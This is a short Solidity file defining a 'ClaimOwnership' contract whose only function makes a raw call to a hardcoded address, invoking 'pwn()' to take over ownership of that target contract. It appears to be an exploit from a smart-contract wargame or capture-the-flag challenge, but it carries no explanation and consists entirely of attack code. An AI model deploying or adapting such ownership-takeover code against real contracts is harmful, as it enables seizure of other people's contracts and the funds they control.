//SPDX-License-Identfier:MIT

pragma solidity ^0.8.0;

contract ClaimOwnership{
    address _D=0x542A5AA23dE74672852eDd17D0302fB9323431D2;
    function claim() external {
        (bool success,bytes memory data)=_D.call(abi.encodeWithSignature("pwn()"));

    }
}